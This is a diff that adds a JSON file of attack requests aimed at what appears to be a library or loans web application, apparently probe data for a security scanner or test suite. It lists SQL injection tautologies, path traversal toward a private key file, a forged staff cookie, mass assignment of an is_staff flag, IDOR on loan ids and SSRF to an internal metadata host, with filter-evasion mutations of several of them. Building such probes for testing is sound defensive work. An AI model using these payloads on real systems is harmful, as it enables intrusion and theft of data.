@@ -1,0 +1,205 @@
+{
+  "auth_bypass:GET /staff/report": [
+    {
+      "endpoint": "GET /staff/report",
+      "headers": {
+        "Cookie": "as_member=staff"
+      },
+      "json_body": null,
+      "method": "GET",
+      "note": "auth_bypass: a Cookie may name the staff member",
+      "params": {},
+      "path": "/staff/report",
+      "vuln_class": "auth_bypass"
+    },
+    {
+      "endpoint": "GET /staff/report",
+      "headers": {
+        "Cookie": "As_member=staff"
+      },
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of 'as_member=staff': capitalised value",
+      "params": {},
+      "path": "/staff/report",
+      "vuln_class": "auth_bypass"
+    },
+    {
+      "endpoint": "GET /staff/report",
+      "headers": {
+        "Cookie": "AS_MEMBER=STAFF"
+      },
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of 'as_member=staff': upper-case value",
+      "params": {},
+      "path": "/staff/report",
+      "vuln_class": "auth_bypass"
+    },
+    {
+      "endpoint": "GET /staff/report",
+      "headers": {
+        "Cookie": " as_member=staff"
+      },
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of 'as_member=staff': leading space",
+      "params": {},
+      "path": "/staff/report",
+      "vuln_class": "auth_bypass"
+    }
+  ],
+  "idor:GET /loans/{loan_id}": [
+    {
+      "endpoint": "GET /loans/{loan_id}",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "idor: loan ids may be read across members",
+      "params": {},
+      "path": "/loans/1",
+      "vuln_class": "idor"
+    }
+  ],
+  "mass_assignment:PATCH /members/me": [
+    {
+      "endpoint": "PATCH /members/me",
+      "headers": {},
+      "json_body": {
+        "is_staff": true
+      },
+      "method": "PATCH",
+      "note": "mass_assignment: a body key may set the is_staff flag",
+      "params": {},
+      "path": "/members/me",
+      "vuln_class": "mass_assignment"
+    }
+  ],
+  "path_traversal:GET /covers": [
+    {
+      "endpoint": "GET /covers",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "path_traversal: the cover name may climb out of the covers folder",
+      "params": {
+        "name": "../private/ledger_key.txt"
+      },
+      "path": "/covers",
+      "vuln_class": "path_traversal"
+    },
+    {
+      "endpoint": "GET /covers",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of '../private/ledger_key.txt': doubled dot-dot-slash",
+      "params": {
+        "name": "....//private/ledger_key.txt"
+      },
+      "path": "/covers",
+      "vuln_class": "path_traversal"
+    },
+    {
+      "endpoint": "GET /covers",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of '../private/ledger_key.txt': dot-slash mix",
+      "params": {
+        "name": "..././private/ledger_key.txt"
+      },
+      "path": "/covers",
+      "vuln_class": "path_traversal"
+    }
+  ],
+  "sqli:GET /books/search": [
+    {
+      "endpoint": "GET /books/search",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "sqli: a tautology in the search term may return staff-only books",
+      "params": {
+        "q": "' OR 1=1 --"
+      },
+      "path": "/books/search",
+      "vuln_class": "sqli"
+    },
+    {
+      "endpoint": "GET /books/search",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of \"' OR 1=1 --\": lowercase OR",
+      "params": {
+        "q": "' or 1=1 --"
+      },
+      "path": "/books/search",
+      "vuln_class": "sqli"
+    },
+    {
+      "endpoint": "GET /books/search",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of \"' OR 1=1 --\": mixed-case OR",
+      "params": {
+        "q": "' Or 1=1 --"
+      },
+      "path": "/books/search",
+      "vuln_class": "sqli"
+    },
+    {
+      "endpoint": "GET /books/search",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of \"' OR 1=1 --\": quoted tautology",
+      "params": {
+        "q": "' or '1'='1' --"
+      },
+      "path": "/books/search",
+      "vuln_class": "sqli"
+    },
+    {
+      "endpoint": "GET /books/search",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of \"' OR 1=1 --\": percent-quote tautology",
+      "params": {
+        "q": "%' or 1=1 --"
+      },
+      "path": "/books/search",
+      "vuln_class": "sqli"
+    },
+    {
+      "endpoint": "GET /books/search",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of \"' OR 1=1 --\": space as inline comment",
+      "params": {
+        "q": "'/**/OR/**/1=1/**/--"
+      },
+      "path": "/books/search",
+      "vuln_class": "sqli"
+    }
+  ],
+  "ssrf:POST /covers/fetch": [
+    {
+      "endpoint": "POST /covers/fetch",
+      "headers": {},
+      "json_body": {
+        "book_id": 2,
+        "url": "http://metadata.internal/latest/secret"
+      },
+      "method": "POST",
+      "note": "ssrf: the cover URL may point at an internal metadata host",
+      "params": {},
+      "path": "/covers/fetch",
+      "vuln_class": "ssrf"
+    }
+  ]
+}
